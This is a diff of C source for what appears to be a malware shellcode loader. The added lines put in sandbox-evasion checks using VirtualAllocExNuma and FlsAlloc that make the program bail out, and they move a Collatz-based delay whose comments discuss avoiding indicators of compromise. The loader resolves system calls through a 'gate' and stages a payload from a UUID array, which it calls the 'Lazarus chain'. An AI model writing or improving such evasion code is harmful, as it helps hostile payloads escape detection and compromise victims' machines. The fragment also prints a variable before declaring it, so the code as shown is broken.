@@ -11,14 +11,28 @@ UINT64 CollatzConjecture(UINT64 Number, UINT64 Modulus, UINT64 Depth) {
 const char* uuids[] = {};
 
 VOID Entry() {
-    // Waste some time and computation by trying to prove the Collatz Conjecturee
-    // Data depencies + simple operations mean high compute time but (relatively) low CPU usage
-    // Regardless, if you think that high-ish CPU usage is an IOC, remove it
-    UINT64 Result = CollatzConjecture(9223372036854775807, 999999937, 3000100);
-
     InitializeGate();
     DEBUG_PRINT("[+] Gate opened");
     DEBUG_PRINT("[*] Collatz chain complete. Result: %X", Result);
+
+    // Sandbox checks before we get into syscalls
+    LPVOID MemNumaCheck = Gate.Win32.VirtualAllocExNuma((HANDLE)-1, NULL, 0x1000, 0x3000, 0x4, 0);
+    if (!MemNumaCheck) {
+        DEBUG_PRINT("[!] VirtualAllocExNuma returned NULL. Bailing.");
+        return;
+    }
+
+    UINT64 FlsCheck = Gate.Win32.FlsAlloc(NULL);
+    if (!FlsCheck) {
+        DEBUG_PRINT("[!] FlsCheck returned NULL. Bailing.");
+        return;
+    }
+
+    // Waste some time and computation by trying to prove the Collatz Conjecturee
+    // Data depencies + simple operations mean high compute time but (relatively) low CPU usage
+    // Regardless, if you think that high-ish CPU usage is an IOC, remove it
+    UINT64 Result = CollatzConjecture(9223372036854775807, 999999937, 0xdeadbeef);
+
     switch(InitializeModule(&Gate.Modules.Ntdll)) {
         case TRUE:
             DEBUG_PRINT("[*] Initialized Gate.Modules.Ntdll");
@@ -49,6 +63,8 @@ VOID Entry() {
     DEBUG_PRINT("[i] RPCRT4::UuidFromStringA: %X::%X", Gate.Modules.RPCRT4.BaseAddress, Gate.Win32.UuidFromStringA);
 
     int elems = sizeof(uuids) / sizeof(uuids[0]);
+
+    // Exact same Lazarus chain as before
 
     PREP_SYSCALL(Gate.Win32.SHASH_STR("NtAllocateVirtualMemory"));
     PVOID mem = 0;
